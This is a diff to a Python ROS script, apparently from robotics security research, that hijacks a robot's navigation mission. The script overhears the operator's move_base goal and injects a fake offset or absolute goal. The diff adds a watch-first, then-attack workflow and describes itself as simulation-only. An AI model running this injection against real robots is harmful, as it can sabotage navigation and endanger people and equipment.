@@ -27,10 +27,13 @@ extra publisher. That is a true property of what real attackers do; the stealthy
 in-flight rewrite (no extra publisher) is on-the-wire MITM -- deliberately NOT
 built (academic). See docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md.
 
-Usage:
-    python3 attack_goal.py                       # offset (0, +12), wait <=60s
-    python3 attack_goal.py --offset-y 3          # subtle sabotage
-    python3 attack_goal.py --offset-x 5 --offset-y 5 --duration 30
+SEE-THEN-DECIDE (two steps):
+    # STEP 1 -- watch: overhear the operator's real goal and print it, no attack.
+    python3 attack_goal.py --watch
+    # ... you read e.g. "operator's real goal is (10.00, 0.00)", decide a target ...
+    # STEP 2 -- attack: re-run with your chosen values (operator sends its goal again).
+    python3 attack_goal.py --mode abs --abs-x 10 --abs-y 12
+    python3 attack_goal.py --mode offset --offset-y 3
 """
 import argparse
 import csv
@@ -153,6 +156,17 @@ class GoalHijackAttack(object):
         if rospy.is_shutdown():
             return 0
 
+        # WATCH mode: STEP 1 of the see-then-decide flow. Just report the
+        # operator's real goal and exit -- inject NOTHING. Run this first, read
+        # the goal, then re-run WITHOUT --watch and with your chosen
+        # --offset-*/--abs-* values to actually inject (STEP 2).
+        if self.args.watch:
+            rospy.loginfo("WATCH: operator's real goal is (%.4f, %.4f). "
+                          "No injection (--watch). Re-run without --watch and "
+                          "with --mode offset|abs + values to attack.",
+                          real[0], real[1])
+            return 0
+
         if self.args.mode == "offset":
             fake = (real[0] + self.args.offset_x, real[1] + self.args.offset_y)
             rospy.loginfo("INJECTING fake goal: real=(%.2f,%.2f) + offset=(%.2f,%.2f) "
@@ -197,6 +211,11 @@ def parse_args():
     p = argparse.ArgumentParser(
         description="Simulation-only mission-hijack: overhear the operator's "
                     "move_base goal, then inject a fake one (real + offset).")
+    p.add_argument("--watch", action="store_true",
+                   help="STEP 1 (see-then-decide): overhear the operator's real "
+                        "goal, PRINT it, and exit WITHOUT injecting. Read the "
+                        "goal, then re-run without --watch and with --mode + "
+                        "values to attack (STEP 2). Injects nothing.")
     p.add_argument("--mode", choices=["offset", "abs"], default="offset",
                    help="fake-goal targeting mode: 'offset' = real goal + "
                         "--offset-x/--offset-y (default); 'abs' = exactly "
